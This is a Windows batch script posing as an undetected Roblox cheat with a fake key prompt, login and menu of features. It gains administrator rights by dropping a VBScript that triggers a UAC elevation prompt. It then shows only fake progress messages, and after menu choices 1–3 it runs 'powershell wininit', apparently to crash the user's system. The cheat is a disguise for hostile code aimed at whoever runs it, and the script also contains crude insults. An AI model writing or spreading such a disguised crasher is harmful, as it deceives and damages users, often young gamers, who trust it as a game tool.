@echo off
title loading...
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo starting...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

@echo off&setlocal enabledelayedexpansion
setlocal enabledelayedexpansion
set "h=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
set "n=20"
set "o="
for /L %%i in (1,1,%n%) do set/a "i=!random!%%52"&call set "o=!o!%%h:~!i!,1%%"

title !o!
echo.
echo note:
echo 1. fully reworked to bedt external
echo 2. the key will be different after updates
echo 3. get the key from brownies
echo 4. full undetected
pause
goto loadinh

:loadinh
cls
echo getting process key...
timeout /t 2 /nobreak >nul
echo process key: %random%
echo crack loading...
timeout /t 3 /nobreak >nul 
echo roblox's dll file was changed!
echo changing back after external has closed
echo external loading...
timeout /t 5 /nobreak >nul
echo external loaded!
timeout /t 1 /nobreak >nul
goto key

:key 
cls
echo.
set /p key="key: "
if /I "%key%" EQU "broniswantwife" goto username
else (
	goto wrongkey
)

:username
cls
echo.
set /p name="username: "
echo.
if /I "%name%" EQU "meta" goto password
else (
	cls
	echo.
	echo wrong name!
	echo.
	echo press any key to back to username
	pause >nul
	goto username
)

:password
cls
echo.
set /p pw="password: "
echo.
if /I "%pw%" EQU "meta" goto main
else (
	cls
	echo.
	echo wrong password!
	echo.
	echo press any key to back to password
	pause >nul
	goto password
)

:wrongkey
cls
echo.
echo key invalid
echo.
pause
goto key

:main
cls
echo.
echo interface loading...
timeout /t 2 /nobreak >nul
echo interface loaded
echo.
echo loading commands
timeout /t 2 /nobreak >nul
echo commands loaded!
echo.
echo going to the main gui...
timeout /t 3 /nobreak >nul
goto gui

:gui
cls
echo.
echo lists of commands:
echo.
echo 1.speed 50 (press c to toggle)
echo.
echo 2.die (press v to die)
echo.
echo 3.chams (press x to toggle)
echo.
echo 4.fly (press n to toggle)
echo.
set /p comand="command: "
if /I "%comand%" EQU "1" goto 1
if /I "%comand%" EQU "2" goto 2
if /I "%comand%" EQU "3" goto 3
if /I "%comand%" EQU "4" goto 4
if /I "%comand%" EQU "67" goto 67
if /I "%comand%" EQU "i am definite and real!" goto real
else (
	goto gui
)

:1
cls
echo.
echo loading...
timeout /t 1 /nobreak >nul
echo speed has set to 50! (press c to toggle)
echo.
echo press any key to go back to the main gui
pause >nul
powershell wininit
goto gui

:2
cls
echo.
echo loading...
timeout /t 1 /nobreak >nul
echo done! (press v to die)
echo.
echo press any key to go back to the main gui
pause >nul
powershell wininit
goto gui

:3
cls
echo.
echo loading...
timeout /t 1 /nobreak >nul
echo done! (press x to toggle)
echo.
echo press any key to go back to the main gui
pause >nul
powershell wininit
goto gui

:4
cls
echo.
echo loading...
timeout /t 1 /nobreak >nul
echo done! (press n to toggle)
echo.
echo press any key to go back to the main gui
pause >nul
goto gui

:67
cls
echo.
echo fukc off dud
echo.
pause
goto gui

:real
cls
echo.
echo nice!
echo.
echo press any key to go back to the main gui
pause >nul
goto gui

